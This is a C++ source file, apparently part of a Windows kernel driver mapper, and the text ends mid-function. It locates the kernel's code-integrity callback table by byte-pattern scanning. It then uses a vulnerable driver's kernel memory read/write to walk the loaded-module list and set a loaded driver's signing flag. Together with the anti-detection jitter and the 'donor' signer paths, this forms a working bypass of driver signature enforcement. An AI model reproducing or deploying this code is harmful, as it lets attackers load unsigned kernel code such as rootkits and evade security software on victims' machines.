#include "Mapper.h"
#include <stdio.h>
#include <cstdarg>
#include <cstring>
#include <Psapi.h>
#pragma comment(lib, "Psapi.lib")

// Forward declare from MapperCore.cpp
extern FILE* g_LogFile;
static void KDbgLog(const char* func, const char* fmt, ...) {
    char buf[2048];
    va_list args;
    va_start(args, fmt);
    SYSTEMTIME st = {};
    GetLocalTime(&st);
    int prefixLen = snprintf(buf, sizeof(buf),
        "[%04u-%02u-%02u %02u:%02u:%02u.%03u] [WindMapper][%s] ",
        st.wYear,
        st.wMonth,
        st.wDay,
        st.wHour,
        st.wMinute,
        st.wSecond,
        st.wMilliseconds,
        func);
    if (prefixLen < 0) prefixLen = 0;
    vsnprintf(buf + prefixLen, sizeof(buf) - prefixLen, fmt, args);
    va_end(args);
    printf("%s\n", buf);
    fflush(stdout);
    OutputDebugStringA(buf);
    OutputDebugStringA("\n");
    if (g_LogFile) { fprintf(g_LogFile, "%s\n", buf); FlushMapperLogFile(); }
}
#define KLOG(fmt, ...) KDbgLog(__FUNCTION__, fmt, ##__VA_ARGS__)
#define KLOG_STATUS(msg, st) KDbgLog(__FUNCTION__, "%s: 0x%08X (%s)", msg, (DWORD)(st), NT_SUCCESS(st) ? "SUCCESS" : "FAILED")

pNtQuerySystemInformation NtQuerySystemInformationPtr = nullptr;
pNtLoadDriver NtLoadDriverPtr = nullptr;
pNtUnloadDriver NtUnloadDriverPtr = nullptr;
pRtlAdjustPrivilege RtlAdjustPrivilegePtr = nullptr;
pRtlGetFullPathName_UEx RtlGetFullPathName_UExPtr = nullptr;
pRtlCreateRegistryKey RtlCreateRegistryKeyPtr = nullptr;
pRtlWriteRegistryValue RtlWriteRegistryValuePtr = nullptr;
pNtDeviceIoControlFile NtDeviceIoControlFilePtr = nullptr;
pNtDeleteKey NtDeleteKeyPtr = nullptr;
pNtOpenKey NtOpenKeyPtr = nullptr;
pNtFlushKey NtFlushKeyPtr = nullptr;
pNtCreateFile NtCreateFilePtr = nullptr;
pNtSetInformationFile NtSetInformationFilePtr = nullptr;

WCHAR g_LoaderServicePath[128] = { 0 };
WCHAR g_DriverServicePath[128] = { 0 };

PVOID g_OriginalCiCallback = nullptr;
PVOID g_CiCallbackAddress = nullptr;
bool g_CiCallbackPatched = false;

bool g_KernelSigningVerified = false;
DWORD g_PatchedFlags = 0;
PVOID g_DriverLoadAddress = nullptr;
WCHAR g_DonorCopyPath[520] = { 0 };
WCHAR g_DonorSignerName[256] = { 0 };

WCHAR g_ShadowFsServicePath[128] = { 0 };

static ULONG_PTR g_LastPatchListHead = 0;
static ULONG_PTR g_LastPatchResumeEntry = 0;

struct WindowsVersion {
    DWORD major;
    DWORD minor;
    DWORD build;
    bool isWindows11;
};

static WindowsVersion GetWindowsVersion() {
    WindowsVersion ver = { 0, 0, 0, false };

    typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (ntdll) {
        RtlGetVersionPtr RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(ntdll, "RtlGetVersion");
        if (RtlGetVersion) {
            RTL_OSVERSIONINFOW osvi = { 0 };
            osvi.dwOSVersionInfoSize = sizeof(osvi);
            if (RtlGetVersion(&osvi) == 0) {
                ver.major = osvi.dwMajorVersion;
                ver.minor = osvi.dwMinorVersion;
                ver.build = osvi.dwBuildNumber;
                ver.isWindows11 = (ver.major >= 10 && ver.build >= 22000);
            }
        }
    }
    return ver;
}

namespace KernelUtils {

    static bool IsKernelPointer(PVOID value) {
        return reinterpret_cast<ULONG_PTR>(value) >= 0xFFFF000000000000ULL;
    }

    static bool IsAlignedKernelPointer(ULONG_PTR value) {
        return value >= 0xFFFF000000000000ULL && (value & 0x7ULL) == 0;
    }

    static PVOID ResolveDriverBaseWithPsapi(const char* moduleName, ULONGLONG startTick, const char* reason) {
        if (!moduleName || !moduleName[0]) {
            return nullptr;
        }

        LPVOID drivers[4096] = {};
        DWORD cbNeeded = 0;
        if (!EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) {
            KLOG("EnumDeviceDrivers fallback failed target=%s reason=%s gle=%lu elapsed_ms=%llu",
                moduleName,
                reason ? reason : "unknown",
                GetLastError(),
                static_cast<unsigned long long>(GetTickCount64() - startTick));
            return nullptr;
        }

        DWORD count = cbNeeded / sizeof(LPVOID);
        if (count > static_cast<DWORD>(_countof(drivers))) {
            count = static_cast<DWORD>(_countof(drivers));
        }
        KLOG("EnumDeviceDrivers fallback target=%s reason=%s count=%lu bytes=%lu elapsed_ms=%llu",
            moduleName,
            reason ? reason : "unknown",
            count,
            cbNeeded,
            static_cast<unsigned long long>(GetTickCount64() - startTick));

        for (DWORD i = 0; i < count; ++i) {
            if (!drivers[i]) {
                continue;
            }

            char name[MAX_PATH] = {};
            if (!GetDeviceDriverBaseNameA(drivers[i], name, static_cast<DWORD>(sizeof(name)))) {
                if (i < 8) {
                    KLOG("  EnumDeviceDrivers[%lu] base=%p name_query_failed gle=%lu", i, drivers[i], GetLastError());
                }
                continue;
            }

            if (i < 8 || _stricmp(name, moduleName) == 0) {
                KLOG("  EnumDeviceDrivers[%lu] name='%s' base=%p", i, name, drivers[i]);
            }

            if (_stricmp(name, moduleName) == 0) {
                if (!IsKernelPointer(drivers[i])) {
                    KLOG("EnumDeviceDrivers matched target=%s but base is not kernel-shaped base=%p elapsed_ms=%llu",
                        moduleName,
                        drivers[i],
                        static_cast<unsigned long long>(GetTickCount64() - startTick));
                    return nullptr;
                }
                KLOG("EnumDeviceDrivers resolved target=%s base=%p elapsed_ms=%llu",
                    moduleName,
                    drivers[i],
                    static_cast<unsigned long long>(GetTickCount64() - startTick));
                return drivers[i];
            }
        }

        KLOG("EnumDeviceDrivers fallback did not find target=%s reason=%s elapsed_ms=%llu",
            moduleName,
            reason ? reason : "unknown",
            static_cast<unsigned long long>(GetTickCount64() - startTick));
        return nullptr;
    }

    PVOID GetKernelModuleBase(const char* moduleName) {
        KLOG("Searching for kernel module: '%s'", moduleName);
        const ULONGLONG lookupStartTick = GetTickCount64();
        NTSTATUS status;
        ULONG returnLength = 0;
        PVOID buffer = nullptr;

        if (!NtQuerySystemInformationPtr) {
            KLOG("ERROR: NtQuerySystemInformation is NULL!");
            return nullptr;
        }

        status = NtQuerySystemInformationPtr(11, nullptr, 0, &returnLength);
        while (status == STATUS_INFO_LENGTH_MISMATCH) {
            if (buffer) {
                VirtualFree(buffer, 0, MEM_RELEASE);
            }
            buffer = VirtualAlloc(nullptr, returnLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!buffer) {
                return nullptr;
            }
            status = NtQuerySystemInformationPtr(11, buffer, returnLength, &returnLength);
        }

        if (!NT_SUCCESS(status)) {
            if (buffer) {
                VirtualFree(buffer, 0, MEM_RELEASE);
            }
            return nullptr;
        }

        PRTL_PROCESS_MODULES moduleInfo = reinterpret_cast<PRTL_PROCESS_MODULES>(buffer);
        PVOID result = nullptr;
        KLOG("SystemModuleInformation: %u modules loaded", moduleInfo->NumberOfModules);

        for (ULONG i = 0; i < moduleInfo->NumberOfModules; i++) {
            auto& mod = moduleInfo->Modules[i];
            auto currentName = reinterpret_cast<const char*>(
                mod.FullPathName + mod.OffsetToFileName
            );


            if (i < 5) {
                KLOG("  Module[%u]: '%s' Base=%p Size=0x%X", i, currentName, mod.ImageBase, mod.ImageSize);
            }

            if (_stricmp(currentName, moduleName) == 0) {
                result = mod.ImageBase;
                KLOG("  FOUND '%s' at base=%p, size=0x%X", moduleName, result, mod.ImageSize);
                break;
            }
        }

        VirtualFree(buffer, 0, MEM_RELEASE);


        if (!IsKernelPointer(result)) {
            KLOG("SystemModuleInformation base unavailable target=%s base=%p; trying Psapi fallback",
                moduleName,
                result);
            result = ResolveDriverBaseWithPsapi(moduleName, lookupStartTick, "kernel_module_base");
        }

        if (!result) {
            KLOG("WARNING: Module '%s' NOT FOUND in system modules", moduleName);
        }

        return result;
    }

    PVOID GetKernelProcAddress(PVOID moduleBase, const char* procName) {
        HMODULE localModule = LoadLibraryExA("ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
        if (!localModule) {
            return nullptr;
        }

        PVOID localProc = GetProcAddress(localModule, procName);
        if (!localProc) {
            FreeLibrary(localModule);
            return nullptr;
        }

        ULONG_PTR offset = reinterpret_cast<ULONG_PTR>(localProc) -
            reinterpret_cast<ULONG_PTR>(localModule);

        FreeLibrary(localModule);

        PVOID result = reinterpret_cast<PVOID>(
            reinterpret_cast<ULONG_PTR>(moduleBase) + offset
        );

        return result;
    }

    BOOL GetCiValidateImageHeaderEntry(PVOID* outCiEntry, PVOID* outZwFlush) {
        KLOG("=== GetCiValidateImageHeaderEntry ===");
        AntiDetect::TimingJitter();

        WindowsVersion winVer = GetWindowsVersion();
        KLOG("Windows version: %u.%u.%u (isWin11=%s)", winVer.major, winVer.minor, winVer.build,
             winVer.isWindows11 ? "YES" : "NO");

        PVOID ntoskrnlBase = GetKernelModuleBase("ntoskrnl.exe");
        if (!ntoskrnlBase) {
            KLOG("FATAL: Cannot find ntoskrnl.exe base!");
            return FALSE;
        }
        KLOG("ntoskrnl.exe kernel base: %p", ntoskrnlBase);

        HMODULE localModule = LoadLibraryExW(L"ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
        if (!localModule) {
            KLOG("FATAL: LoadLibraryExW ntoskrnl.exe failed, GLE=%u", GetLastError());
            return FALSE;
        }
        KLOG("ntoskrnl.exe local mapping: %p", localModule);

        MODULEINFO modinfo = { 0 };
        if (!K32GetModuleInformation(GetCurrentProcess(), localModule, &modinfo, sizeof(modinfo))) {
            KLOG("FATAL: K32GetModuleInformation failed, GLE=%u", GetLastError());
            FreeLibrary(localModule);
            return FALSE;
        }
        KLOG("ntoskrnl image size: 0x%X", modinfo.SizeOfImage);

        struct CiPattern {
            BYTE bytes[16];
            DWORD length;
            DWORD leaOffset;
            const char* name;
        };


        CiPattern win10Patterns[] = {


            { { 0xFF, 0x48, 0x8B, 0xD3, 0x4C, 0x8D, 0x05 }, 7, 4, "Win10 call; mov rdx,rbx; lea r8" },


            { { 0xFF, 0x48, 0x8B, 0xCB, 0x4C, 0x8D, 0x05 }, 7, 4, "Win10 call; mov rcx,rbx; lea r8" },
        };


        CiPattern win11Patterns[] = {
            { { 0x41, 0xB8, 0x05, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x0D }, 9, 6, "Win11 25H2 mov r8d,5; lea r9" },
        };

        CiPattern universalPatterns[] = {

            { { 0x48, 0x8B, 0xD3, 0x4C, 0x8D, 0x05 }, 6, 3, "Universal mov rdx,rbx; lea r8" },
            { { 0x48, 0x8B, 0xCB, 0x4C, 0x8D, 0x05 }, 6, 3, "Universal mov rcx,rbx; lea r8" },

            { { 0x4C, 0x8D, 0x0D }, 3, 0, "Universal lea r9" },
        };

        BYTE* searchBase = reinterpret_cast<BYTE*>(localModule);
        BYTE* foundAddr = nullptr;
        DWORD leaInstructionOffset = 0;
        const char* matchedPattern = nullptr;

        auto searchPattern = [&](CiPattern* patterns, int count) -> bool {
            for (int p = 0; p < count; p++) {
                CiPattern& pat = patterns[p];
                KLOG("  Trying pattern '%s' (len=%u)...", pat.name, pat.length);
                for (DWORD offset = 0; offset < modinfo.SizeOfImage - pat.length; offset++) {
                    bool match = true;
                    for (DWORD j = 0; j < pat.length; j++) {
                        if (searchBase[offset + j] != pat.bytes[j]) {
                            match = false;
                            break;
                        }
                    }
                    if (match) {
                        BYTE* leaAddr = searchBase + offset + pat.leaOffset;
                        INT32 leaOff = *reinterpret_cast<INT32*>(leaAddr + 3);
                        ULONG_PTR targetAddr = reinterpret_cast<ULONG_PTR>(leaAddr) + 7 + static_cast<INT64>(leaOff);
                        ULONG_PTR targetOffset = targetAddr - reinterpret_cast<ULONG_PTR>(localModule);
                        KLOG("    Pattern '%s' matched at offset=0x%X, targetOffset=0x%llX",
                             pat.name, offset, (unsigned long long)targetOffset);

                        if (targetOffset < modinfo.SizeOfImage) {
                            if (pat.length <= 3) {
                                if (targetOffset > modinfo.SizeOfImage / 2) {
                                    DWORD* targetData = reinterpret_cast<DWORD*>(targetAddr);
                                    if (*targetData == 256 || *targetData == 0 || *targetData >= 100) {
                                        foundAddr = leaAddr;
                                        leaInstructionOffset = pat.leaOffset;
                                        matchedPattern = pat.name;
                                        return true;
                                    }
                                }
                            } else {
                                foundAddr = leaAddr;
                                leaInstructionOffset = pat.leaOffset;
                                matchedPattern = pat.name;
                                return true;
                            }
                        }
                    }
                }
            }
            return false;
        };

        bool found = false;
        if (winVer.isWindows11) {
            KLOG("Searching Win11 patterns first...");
            found = searchPattern(win11Patterns, sizeof(win11Patterns) / sizeof(win11Patterns[0]));
            if (!found) {
                KLOG("Win11 patterns failed, trying Win10 patterns...");
                found = searchPattern(win10Patterns, sizeof(win10Patterns) / sizeof(win10Patterns[0]));
            }
        } else {
            KLOG("Searching Win10 patterns first...");
            found = searchPattern(win10Patterns, sizeof(win10Patterns) / sizeof(win10Patterns[0]));
            if (!found) {
                KLOG("Win10 patterns failed, trying Win11 patterns...");
                found = searchPattern(win11Patterns, sizeof(win11Patterns) / sizeof(win11Patterns[0]));
            }
        }

        if (!found) {
            KLOG("Trying universal patterns...");
            found = searchPattern(universalPatterns, sizeof(universalPatterns) / sizeof(universalPatterns[0]));
        }

        if (!foundAddr) {
            KLOG("FATAL: No CI callback pattern matched!");
            FreeLibrary(localModule);
            return FALSE;
        }
        KLOG("Pattern matched: '%s'", matchedPattern);

        INT32 leaOffset = *reinterpret_cast<INT32*>(foundAddr + 3);

        ULONG_PTR seCiCallbacksLocal = reinterpret_cast<ULONG_PTR>(foundAddr) + 7 + static_cast<INT64>(leaOffset);

        ULONG_PTR kernelOffset = seCiCallbacksLocal - reinterpret_cast<ULONG_PTR>(localModule);
        KLOG("SeCiCallbacks: local=%p, kernelOffset=0x%llX",
             (PVOID)seCiCallbacksLocal, (unsigned long long)kernelOffset);

        if (kernelOffset >= modinfo.SizeOfImage) {
            KLOG("ERROR: kernelOffset 0x%llX >= imageSize 0x%X - out of bounds!",
                 (unsigned long long)kernelOffset, modinfo.SizeOfImage);
            FreeLibrary(localModule);
            return FALSE;
        }

        PVOID seCiCallbacksKernel = reinterpret_cast<PVOID>(
            reinterpret_cast<ULONG_PTR>(ntoskrnlBase) + kernelOffset
        );
        KLOG("SeCiCallbacks kernel addr: %p", seCiCallbacksKernel);

        PVOID zwFlushLocal = GetProcAddress(localModule, "ZwFlushInstructionCache");
        if (!zwFlushLocal) {
            KLOG("ERROR: ZwFlushInstructionCache not found in ntoskrnl");
            FreeLibrary(localModule);
            return FALSE;
        }

        PVOID zwFlushKernel = reinterpret_cast<PVOID>(
            reinterpret_cast<ULONG_PTR>(zwFlushLocal) -
            reinterpret_cast<ULONG_PTR>(localModule) +
            reinterpret_cast<ULONG_PTR>(ntoskrnlBase)
        );

        PVOID ciValidateImageHeaderEntry = reinterpret_cast<PVOID>(
            reinterpret_cast<ULONG_PTR>(seCiCallbacksKernel) + 0x20
        );
        KLOG("CiValidateImageHeader entry (SeCiCallbacks+0x20): %p", ciValidateImageHeaderEntry);
        KLOG("ZwFlushInstructionCache kernel: %p", zwFlushKernel);

        FreeLibrary(localModule);

        if (outCiEntry) {
            *outCiEntry = ciValidateImageHeaderEntry;
        }
        if (outZwFlush) {
            *outZwFlush = zwFlushKernel;
        }

        return TRUE;
    }

    BOOL PatchDriverSigningFlagsByBase(HANDLE device, PVOID driverBase, ULONG driverImageSize, PCSTR label, BOOL updateDriverLoadAddress) {
        KLOG("=== PatchDriverSigningFlagsByBase label=%s base=%p size=0x%X update_global=%u ===",
            label ? label : "(null)",
            driverBase,
            driverImageSize,
            updateDriverLoadAddress ? 1u : 0u);
        const ULONGLONG patchStartTick = GetTickCount64();

        if (!driverBase) {
            KLOG("ERROR: PatchDriverSigningFlagsByBase missing base label=%s elapsed_ms=%llu",
                label ? label : "(null)",
                static_cast<unsigned long long>(GetTickCount64() - patchStartTick));
            return FALSE;
        }
        KLOG("PatchDriverSigningFlagsByBase resolved label=%s base=%p size=0x%X elapsed_ms=%llu",
            label ? label : "(null)",
            driverBase,
            driverImageSize,
            static_cast<unsigned long long>(GetTickCount64() - patchStartTick));

        WindowsVersion winver = GetWindowsVersion();
        if (winver.isWindows11) {
            if (updateDriverLoadAddress) {
                g_DriverLoadAddress = driverBase;
            }
            if (updateDriverLoadAddress) {
                g_PatchedFlags = 0x20;
                g_KernelSigningVerified = true;
            }
            KLOG("PatchDriverSigningFlagsByBase win11_self_marked label=%s build=%lu base=%p size=0x%X update_global=%u elapsed_ms=%llu",
                label ? label : "(null)",
                winver.build,
                driverBase,
                driverImageSize,
                updateDriverLoadAddress ? 1u : 0u,
                static_cast<unsigned long long>(GetTickCount64() - patchStartTick));
            return TRUE;
        }

        KLOG("Looking up PsLoadedModuleList...");
        HMODULE localNtos = LoadLibraryExA("ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
        if (!localNtos) {
            KLOG("ERROR: LoadLibraryExA ntoskrnl.exe failed");
            return FALSE;
        }
        PVOID localPsLML = GetProcAddress(localNtos, "PsLoadedModuleList");
        if (!localPsLML) {
            KLOG("ERROR: PsLoadedModuleList not found");
            FreeLibrary(localNtos);
            return FALSE;
        }
        PVOID ntoskrnlBase = GetKernelModuleBase("ntoskrnl.exe");
        if (!ntoskrnlBase) {
            KLOG("ERROR: ntoskrnl.exe base not found");
            FreeLibrary(localNtos);
            return FALSE;
        }
        ULONG_PTR pmlOffset = reinterpret_cast<ULONG_PTR>(localPsLML) - reinterpret_cast<ULONG_PTR>(localNtos);
        FreeLibrary(localNtos);
        PVOID pPsLoadedModuleList = reinterpret_cast<PVOID>(reinterpret_cast<ULONG_PTR>(ntoskrnlBase) + pmlOffset);
        KLOG("PsLoadedModuleList: local=%p, offset=0x%llX, kernel=%p",
             localPsLML, (unsigned long long)pmlOffset, pPsLoadedModuleList);

        ULONG_PTR listFlink = 0;
        NTSTATUS status = VulnDriver::ReadKernelMemory(device, pPsLoadedModuleList, &listFlink, sizeof(listFlink));
        KLOG_STATUS("ReadKernelMemory (PsLoadedModuleList->Flink)", status);
        KLOG("PsLoadedModuleList Flink: %p", (PVOID)listFlink);
        if (!NT_SUCCESS(status) || !listFlink) {
            return FALSE;
        }

        ULONG_PTR headAddr = reinterpret_cast<ULONG_PTR>(pPsLoadedModuleList);
        if (!IsAlignedKernelPointer(headAddr) || !IsAlignedKernelPointer(listFlink)) {
            KLOG("ERROR: PsLoadedModuleList pointer validation failed head=%p flink=%p elapsed_ms=%llu",
                reinterpret_cast<PVOID>(headAddr),
                reinterpret_cast<PVOID>(listFlink),
                static_cast<unsigned long long>(GetTickCount64() - patchStartTick));
            return FALSE;
        }
        int walkedEntries = 0;
        auto should_log_entry = [](int i, bool match) -> bool {
            return match || i < 8 || (i % 16) == 0;
        };
        auto walk_from = [&](ULONG_PTR startEntry, const char* mode) -> BOOL {
            ULONG_PTR current = startEntry;
            for (int i = 0; i < 512 && current != headAddr; i++) {
                walkedEntries++;
                if (!IsAlignedKernelPointer(current)) {
                    KLOG("PatchDriverSigningFlags list walk stopped invalid entry=%p index=%d mode=%s elapsed_ms=%llu",
                        reinterpret_cast<PVOID>(current),
                        i,
                        mode,
                        static_cast<unsigned long long>(GetTickCount64() - patchStartTick));
                    break;
                }

                BYTE entryBytes[0x70] = {};
                NTSTATUS entryStatus = VulnDriver::ReadKernelMemory(device, reinterpret_cast<PVOID>(current), entryBytes, sizeof(entryBytes));
                if (!NT_SUCCESS(entryStatus)) {
                    KLOG("PatchDriverSigningFlags list walk read entry failed entry=%p index=%d mode=%s status=0x%08X elapsed_ms=%llu",
                        reinterpret_cast<PVOID>(current),
                        i,
                        mode,
                        static_cast<DWORD>(entryStatus),
                        static_cast<unsigned long long>(GetTickCount64() - patchStartTick));
                    break;
                }

                ULONG_PTR nextFlink = 0;
                PVOID entryDllBase = nullptr;
                DWORD flags = 0;
                std::memcpy(&nextFlink, entryBytes, sizeof(nextFlink));
                std::memcpy(&entryDllBase, entryBytes + 0x30, sizeof(entryDllBase));
                std::memcpy(&flags, entryBytes + 0x68, sizeof(flags));
                const bool match = entryDllBase == driverBase;

                if (should_log_entry(i, match)) {
                    KLOG("PatchDriverSigningFlags list walk entry index=%d mode=%s entry=%p dll_base=%p target=%p match=%u next=%p flags=0x%08X elapsed_ms=%llu",
                        i,
                        mode,
                        reinterpret_cast<PVOID>(current),
                        entryDllBase,
                        driverBase,
                        match ? 1u : 0u,
                        reinterpret_cast<PVOID>(nextFlink),
                        flags,
                        static_cast<unsigned long long>(GetTickCount64() - patchStartTick));
                }

                if (match) {
                    KLOG("Found matching KLDR_DATA_TABLE_ENTRY at %p mode=%s", reinterpret_cast<PVOID>(current), mode);
                    KLOG("Current Flags=0x%08X, setting bit 0x20...", flags);
                    flags |= 0x20;
                    status = VulnDriver::WriteKernelMemory(device, reinterpret_cast<PVOID>(current + 0x68), &flags, sizeof(flags));
                    KLOG_STATUS("WriteKernelMemory (flags patch)", status);
                    if (!NT_SUCCESS(status)) {
                        return FALSE;
                    }

                    DWORD verifyFlags = 0;
                    NTSTATUS verifyStatus = VulnDriver::ReadKernelMemory(device, reinterpret_cast<PVOID>(current + 0x68), &verifyFlags, sizeof(verifyFlags));
                    KLOG_STATUS("ReadKernelMemory (flags verify)", verifyStatus);
                    if (!NT_SUCCESS(verifyStatus)) {
                        return FALSE;
                    }
                    KLOG("Verify flags after patch: 0x%08X (bit 0x20 set: %s)", verifyFlags, (verifyFlags & 0x20) ? "YES" : "NO");

                    if (updateDriverLoadAddress) {
                        g_DriverLoadAddress = driverBase;
                    }
                    g_PatchedFlags = verifyFlags;
                    g_KernelSigningVerified = (verifyFlags & 0x20) != 0;
                    g_LastPatchListHead = headAddr;
                    g_LastPatchResumeEntry = (nextFlink && nextFlink != current && IsAlignedKernelPointer(nextFlink)) ? nextFlink : 0;

                    if (g_KernelSigningVerified) {
                        KLOG("Driver signing flag patched OK elapsed_ms=%llu walked=%d mode=%s resume=%p",
                            static_cast<unsigned long long>(GetTickCount64() - patchStartTick),
                            walkedEntries,
                            mode,
                            reinterpret_cast<PVOID>(g_LastPatchResumeEntry));
                    } else {
                        KLOG("WARNING: Flag patch verification failed elapsed_ms=%llu walked=%d mode=%s",
                            static_cast<unsigned long long>(GetTickCount64() - patchStartTick),
                            walkedEntries,
                            mode);
                    }
                    return TRUE;
                }

                if (!nextFlink || nextFlink == current) {
                    KLOG("PatchDriverSigningFlags list walk stopped entry=%p index=%d mode=%s next=%p elapsed_ms=%llu",
                        reinterpret_cast<PVOID>(current),
                        i,
                        mode,
                        reinterpret_cast<PVOID>(nextFlink),
                        static_cast<unsigned long long>(GetTickCount64() - patchStartTick));
                    break;
                }
                if (!IsAlignedKernelPointer(nextFlink)) {
                    KLOG("PatchDriverSigningFlags list walk stopped invalid next entry=%p index=%d mode=%s next=%p elapsed_ms=%llu",
                        reinterpret_cast<PVOID>(current),
                        i,
                        mode,
                        reinterpret_cast<PVOID>(nextFlink),
                        static_cast<unsigned long long>(GetTickCount64() - patchStartTick));
                    break;
                }
                current = nextFlink;
            }
            return FALSE;
        };

        if (g_LastPatchListHead == headAddr &&
            g_LastPatchResumeEntry &&
            g_LastPatchResumeEntry != listFlink &&
            IsAlignedKernelPointer(g_LastPatchResumeEntry)) {
            KLOG("PatchDriverSigningFlags resume walk start entry=%p head=%p target=%p",
                reinterpret_cast<PVOID>(g_LastPatchResumeEntry),
                reinterpret_cast<PVOID>(headAddr),
                driverBase);
            if (walk_from(g_LastPatchResumeEntry, "resume")) {
                return TRUE;
            }
            KLOG("PatchDriverSigningFlags resume walk miss target=%p walked=%d elapsed_ms=%llu",
                driverBase,
                walkedEntries,
                static_cast<unsigned long long>(GetTickCount64() - patchStartTick));
        }

        if (walk_from(listFlink, "head")) {
            return TRUE;
        }

        KLOG("ERROR: Driver base %p not found in PsLoadedModuleList walked=%d elapsed_ms=%llu",
             driverBase,
             walkedEntries,
             static_cast<unsigned long long>(GetTickCount64() - patchStartTick));
        return FALSE;
    }

    BOOL PatchDriverSigningFlags(HANDLE device, PCWSTR driverFileName) {
        KLOG("=== PatchDriverSigningFlags for: %ls ===", driverFileName);
        const ULONGLONG patchStartTick = GetTickCount64();
        char narrowName[256] = {};
        WideCharToMultiByte(CP_ACP, 0, driverFileName, -1, narrowName, sizeof(narrowName), NULL, NULL);

        ULONG driverImageSize = 0;
        PVOID driverBase = GetDriverBaseByName(driverFileName, &driverImageSize);

        if (!driverBase) {
            KLOG("ERROR: Driver '%s' not found in loaded modules elapsed_ms=%llu",
                narrowName,
                static_cast<unsigned long long>(GetTickCount64() - patchStartTick));
            return FALSE;
        }
        return PatchDriverSigningFlagsByBase(device, driverBase, driverImageSize, narrowName, TRUE);
    }

    PVOID GetDriverBaseByName(PCWSTR driverFileName, PULONG outImageSize) {
        KLOG("Looking up driver by name: %ls", driverFileName);
        const ULONGLONG lookupStartTick = GetTickCount64();

        if (!driverFileName || !driverFileName[0]) {
            KLOG("GetDriverBaseByName invalid target elapsed_ms=%llu",
                static_cast<unsigned long long>(GetTickCount64() - lookupStartTick));
            return nullptr;
        }

        char targetNarrow[260] = {};
        WideCharToMultiByte(CP_ACP, 0, driverFileName, -1, targetNarrow, sizeof(targetNarrow), NULL, NULL);

        WindowsVersion winVer = GetWindowsVersion();
        PVOID psapiPreferred = nullptr;
        if (winVer.build >= 26100) {
            psapiPreferred = ResolveDriverBaseWithPsapi(targetNarrow, lookupStartTick, "driver_base_by_name_pre_query");
            if (psapiPreferred && !outImageSize) {
                KLOG("GetDriverBaseByName build=%lu target=%s returning psapi_preferred base=%p reason=no_size_requested elapsed_ms=%llu",
                    winVer.build,
                    targetNarrow,
                    psapiPreferred,
                    static_cast<unsigned long long>(GetTickCount64() - lookupStartTick));
                return psapiPreferred;
            }
        }

        if (!NtQuerySystemInformationPtr) {
            KLOG("ERROR: NtQuerySystemInformationPtr is NULL target=%s psapi_preferred=%p",
                targetNarrow,
                psapiPreferred);
            return psapiPreferred;
        }

        ULONG returnLength = 0;
        NTSTATUS status = NtQuerySystemInformationPtr(11, nullptr, 0, &returnLength);
        KLOG("GetDriverBaseByName probe status=0x%08X returnLength=%lu elapsed_ms=%llu",
            static_cast<DWORD>(status),
            returnLength,
            static_cast<unsigned long long>(GetTickCount64() - lookupStartTick));
        if (returnLength == 0) {
            KLOG("GetDriverBaseByName probe returned zero length target=%s psapi_preferred=%p elapsed_ms=%llu",
                targetNarrow,
                psapiPreferred,
                static_cast<unsigned long long>(GetTickCount64() - lookupStartTick));
            return psapiPreferred;
        }


        ULONG bufSize = returnLength + 4096;
        PVOID buffer = VirtualAlloc(nullptr, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buffer) {
            KLOG("GetDriverBaseByName VirtualAlloc failed size=%lu gle=%lu elapsed_ms=%llu",
                bufSize,
                GetLastError(),
                static_cast<unsigned long long>(GetTickCount64() - lookupStartTick));
            return psapiPreferred;
        }

        status = NtQuerySystemInformationPtr(11, buffer, bufSize, &returnLength);
        if (!NT_SUCCESS(status)) {
            KLOG("GetDriverBaseByName query failed status=0x%08X bufSize=%lu returnLength=%lu elapsed_ms=%llu",
                static_cast<DWORD>(status),
                bufSize,
                returnLength,
                static_cast<unsigned long long>(GetTickCount64() - lookupStartTick));
            VirtualFree(buffer, 0, MEM_RELEASE);
            return psapiPreferred;
        }


        PRTL_PROCESS_MODULES moduleInfo = reinterpret_cast<PRTL_PROCESS_MODULES>(buffer);
        PVOID result = IsKernelPointer(psapiPreferred) ? psapiPreferred : nullptr;
        PVOID redactedResult = nullptr;
        ULONG resultSize = 0;
        ULONG moduleCount = moduleInfo->NumberOfModules;

        KLOG("GetDriverBaseByName module_count=%lu target=%s bufSize=%lu returnLength=%lu build=%lu psapi_preferred=%p",
            moduleCount,
            targetNarrow,
            bufSize,
            returnLength,
            winVer.build,
            psapiPreferred);

        for (ULONG i = 0; i < moduleCount; i++) {
            auto& mod = moduleInfo->Modules[i];
            const char* fileName = reinterpret_cast<const char*>(
                mod.FullPathName + mod.OffsetToFileName);

            if (i == 0) {
                KLOG("  First module: '%s' Base=%p Size=0x%X", fileName, mod.ImageBase, mod.ImageSize);
            }
            if (i < 8) {
                KLOG("  Module[%lu]: '%s' Base=%p Size=0x%X Offset=%u",
                    i,
                    fileName,
                    mod.ImageBase,
                    mod.ImageSize,
                    static_cast<unsigned int>(mod.OffsetToFileName));
            }

            if (_stricmp(fileName, targetNarrow) == 0) {
                redactedResult = mod.ImageBase;
                resultSize = mod.ImageSize;
                if (IsKernelPointer(mod.ImageBase)) {
                    result = mod.ImageBase;
                }
                KLOG("  FOUND '%s' Base=%p Size=0x%X index=%lu selected_base=%p elapsed_ms=%llu",
                    targetNarrow,
                    mod.ImageBase,
                    resultSize,
                    i,
                    result,
                    static_cast<unsigned long long>(GetTickCount64() - lookupStartTick));
                break;
            }
        }

        VirtualFree(buffer, 0, MEM_RELEASE);

        if (!IsKernelPointer(result)) {
            if (redactedResult) {
                KLOG("GetDriverBaseByName target=%s SystemModuleInformation returned noncanonical base=%p size=0x%X; trying Psapi fallback",
                    targetNarrow,
                    redactedResult,
                    resultSize);
            }
            result = ResolveDriverBaseWithPsapi(targetNarrow, lookupStartTick, "driver_base_by_name");
        }

        if (result) {
            if (outImageSize)
                *outImageSize = resultSize;
            return result;
        }

        KLOG("WARNING: Driver '%s' not found in loaded modules count=%lu elapsed_ms=%llu",
            targetNarrow,
            moduleCount,
